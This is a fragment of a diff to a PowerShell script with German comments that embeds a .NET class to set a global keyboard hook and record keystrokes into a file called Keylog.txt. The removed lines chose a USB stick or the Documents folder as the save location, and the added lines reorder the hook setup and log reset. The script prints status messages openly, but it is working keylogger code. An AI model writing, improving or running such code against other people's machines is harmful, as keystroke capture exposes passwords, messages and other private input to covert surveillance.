@@ -57,27 +57,11 @@ public class KeyboardHook {
 "@ -ReferencedAssemblies "System.Windows.Forms", "System.IO"
 }
 
-# === USB-Stick prüfen und Pfad setzen ===
-$usbDrive = [System.IO.DriveInfo]::GetDrives() |
-    Where-Object { $_.DriveType -eq 'Removable' -and $_.IsReady } |
-    Select-Object -First 1
-
-if ($usbDrive) {
-    $logPath = Join-Path $usbDrive.Root "Keylog.txt"
-    Write-Host "USB-Stick erkannt. Speichere nach: $logPath"
-} else {
-    $logPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "Keylog.txt"
-    Write-Host "Kein USB-Stick erkannt. Speichere im Dokumente-Ordner: $logPath"
-}
-
-# Log-Dateipfad in .NET-Klasse setzen
-[KeyboardHook]::LogFilePath = $logPath
+# Hook setzen
+[KeyboardHook]::SetHook()
 
 # Datei leeren oder neu anlegen
-Set-Content -Path $logPath -Value "" -Encoding UTF8
-
-# Hook aktivieren
-[KeyboardHook]::SetHook()
+Set-Content -Path ([KeyboardHook]::LogFilePath) -Value "" -Encoding UTF8
 
 Write-Host "Globaler Keyboard-Hook aktiv. Protokolliere in: $([KeyboardHook]::LogFilePath)"
 Write-Host "Drücke Tasten... Beende mit STRG + C."
